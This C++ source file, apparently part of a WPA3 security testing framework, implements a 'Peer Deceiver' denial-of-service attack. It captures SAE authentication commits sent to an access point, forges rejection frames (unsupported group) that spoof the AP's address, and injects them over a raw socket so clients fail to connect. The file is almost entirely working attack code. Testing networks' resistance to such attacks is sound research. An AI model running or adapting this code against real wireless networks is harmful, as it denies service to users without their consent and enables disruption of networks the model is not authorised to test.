#include "attacks/DoS_hard/no_connect/peer_deceiver/peer_deceiver.h"
#include "attacks/DoS_hard/no_connect/no_connect_helpers.h"

#include <linux/if_packet.h>
#include <sys/socket.h>

#include "attacks/components/setup_connections.h"
#include "attacks/sae_helper.h"
#include "logger/log.h"
#include "logger/log_util.h"
#include "net_parser/dot11_defs.h"
#include "net_parser/radiotap_defs.h"
#include "net_parser/sae_defs.h"

using namespace std;
using namespace Tins;

namespace wpa3_tester::peer_deceiver {

void setup_attack(RunStatus &rs) {
	components::setup_AP(rs, "ap");
}

void run_attack(RunStatus &rs) {
	const HWAddress<6> ap_mac = rs.get_actor("ap").get(SK::mac);
	int injections            = 0;

	no_connect::run_attack(rs,
		"wlan type mgt subtype auth and wlan addr1 " + ap_mac.to_string(),
		"Peer Deceiver: injecting fake SAE rejections (STATUS_UNSUPPORTED_GROUP)",
		[&](const frame_raw_t &frame, int fd, const sockaddr_ll &addr) -> optional<bool> {
			const auto commit = sae_helper::parse_sae_commit(frame);
			if(!commit) return nullopt;
			const uint16_t rt_len = radiotap::get_rt_len(frame);
			const HWAddress<6> sta_mac(frame.data() + rt_len + dot11::ADDR2_OFFSET);
			sae_helper::SAEPair rej;
			rej.status   = sae_defs::STATUS_UNSUPPORTED_GROUP;
			rej.group_id = commit->group_id;
			const auto bytes = sae_helper::make_sae_commit(sta_mac, ap_mac, rej).serialize();
			sendto(fd, bytes.data(), bytes.size(), MSG_DONTWAIT,
				reinterpret_cast<const sockaddr *>(&addr), sizeof(addr));
			++injections;
			log(LogLevel::DEBUG, "Injected rejection → {} (group {})", sta_mac.to_string(), commit->group_id);
			return nullopt;
		});

	log(LogLevel::INFO, "Attack ended, {} rejections injected", injections);

	const bool client_connected = !get_time_logs(rs, "ap", "AP-STA-CONNECTED").empty();
	rs.save_result({{"client_connected", client_connected}});
}

void stats_attack(const RunStatus &rs) {
	no_connect::stats_attack(rs);
}
}
